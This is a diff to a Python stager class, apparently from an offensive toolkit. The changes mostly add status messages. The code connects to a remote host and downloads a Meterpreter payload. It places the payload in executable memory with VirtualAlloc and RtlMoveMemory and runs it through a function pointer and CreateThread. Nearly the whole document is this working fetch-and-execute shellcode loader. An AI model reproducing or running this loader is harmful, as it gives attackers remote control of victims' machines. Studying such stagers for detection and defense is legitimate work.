@@ -33,19 +33,26 @@ class stager():
         utils.arg.CreateSubParserEx(spName, stager.Description, spArgList)
 
     def CreateSocket(self):
+        print(f'{nstate.OKBLUE} Creating Socket...')
         socket.setdefaulttimeout(self.timeout)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.connect((self.remote_host, self.remote_port))
+        #self.sock.connect((self.remote_host, self.remote_port))
+        con = self.sock.connect_ex((self.remote_host, self.remote_port))
+        if con == 0:
+            print(f'{nstate.OKGREEN} Connection established')
+        else:
+            print(f'{nstate.FAIL} Connevtion failed')
 
     def ReceivePayload(self):
         # get 4-byte payload length
         l = struct.unpack("@I", self.sock.recv(4))[0]
 
         # download payload
+        print(f'{nstate.OKBLUE} Download stage...')
         d = self.sock.recv(l)
         while len(d) < l:
             d += self.sock.recv(l - len(d))
-        print(f'Length before bytearray: {len(d)}')
+        print(f'{nstate.OKBLUE} Payload size: {len(d)} bytes')
 
         if self.architecture == 'x64':
             self.payload = bytearray(
@@ -57,8 +64,13 @@ class stager():
                     b"\xbf"
                     + self.sock.fileno().to_bytes(4, byteorder="little")
                     + d)
+        if self.payload:
+            print(f'{nstate.OKGREEN} Stage downloaded!')
+        else:
+            print(f'{nstate.FAIL} Error during download')
             
     def LaunchStage(self):
+        print(f'{nstate.OKBLUE} Trying to execute Meterpreter stage...')
         MEM_COMMIT_RESERVE = 0x00003000
         PAGE_READWRITE_EXECUTE = 0x00000040
 
@@ -81,9 +93,11 @@ class stager():
     #     WaitForSingleObject.restype = None
 
         ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
+
         print(f'Pointer: {ptr}')
         print(f'{len(self.payload)}')
         if ptr:
+            print(f'{nstate.OKGREEN} Memory allocated!')
             buf = (ctypes.c_char * len(self.payload)).from_buffer(self.payload)
             RtlMoveMemory(ptr, buf, len(self.payload))
 
@@ -91,8 +105,12 @@ class stager():
         ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
         ptr_f()
         
-        
+        print(f'{nstate.OKBLUE} Execute payload...')
         ht = CreateThread(0, 0, ptr, 0, 0, ctypes.pointer(0))
+        if ht:
+            print(f'{nstate.OKGREEN} Looks good!')
+        else:
+            print(f'{nstate.FAIL} Payload not executed')
         ctypes.windll.kernel32.WaitForSingleObject(
                 ctypes.c_int(ht),
                 ctypes.c_int(-1))
